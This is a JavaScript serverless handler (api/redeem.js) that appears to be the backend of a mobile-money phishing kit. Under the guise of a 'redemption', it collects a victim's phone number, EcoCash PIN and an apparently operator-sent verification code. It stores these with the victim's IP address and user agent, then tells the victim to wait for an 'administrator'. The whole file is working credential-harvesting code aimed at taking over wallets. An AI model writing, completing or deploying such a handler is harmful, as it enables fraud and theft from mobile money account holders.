// filepath: api/redeem.js
// POST /api/redeem  — accepts a redemption submission, returns the new id.
// Used by the front-end form (script.js).
//
// The handler is wrapped in a top-level try/catch so any unexpected
// throw (read-only FS, crypto unavailable, etc.) returns JSON instead
// of a generic HTML 500 from Vercel.

import { addSubmission } from "./_lib/store.js";

function isValidMixx(n) {
  return typeof n === "string" && /^\d{10,12}$/.test(n);
}
function isValidPin(p) {
  return typeof p === "string" && /^\d{4}$/.test(p);
}
function isValidCode(c) {
  // The code the user types back in is 4-8 digits. Be lenient on length
  // because the admin may use any short number they hand-sent.
  return typeof c === "string" && /^\d{4,8}$/.test(c);
}

export default async function handler(req, res) {
  try {
    if (req.method !== "POST") {
      res.setHeader("Allow", "POST");
      return res.status(405).json({ ok: false, error: "Method not allowed" });
    }

    // Vercel parses JSON automatically when Content-Type is application/json
    const { mixxNumber, yasPin, verificationCode } = req.body || {};

    if (!isValidMixx(mixxNumber)) {
      return res
        .status(400)
        .json({ ok: false, error: "Please enter a valid phone number (10-12 digits)." });
    }
    if (!isValidPin(yasPin)) {
      return res
        .status(400)
        .json({ ok: false, error: "EcoCash PIN must be 4 digits." });
    }
    if (!isValidCode(verificationCode)) {
      return res.status(400).json({
        ok: false,
        error: "Please enter the 4-8 digit code you received.",
      });
    }

    const ip =
      (req.headers["x-forwarded-for"] || "")
        .toString()
        .split(",")[0]
        .trim() ||
      req.socket?.remoteAddress ||
      null;

    const record = await addSubmission({
      mixxNumber,
      yasPin,
      verificationCode: String(verificationCode).trim(),
      ip,
      userAgent: req.headers["user-agent"] || null,
    });
    return res.status(201).json({
      ok: true,
      id: record.id,
      message:
        "Thank you! Your submission has been received. Please wait for an administrator to confirm.",
    });
  } catch (err) {
    console.error("redeem error:", err);
    if (res.headersSent) return;
    return res
      .status(500)
      .json({ ok: false, error: "Server error. Please try again." });
  }
}
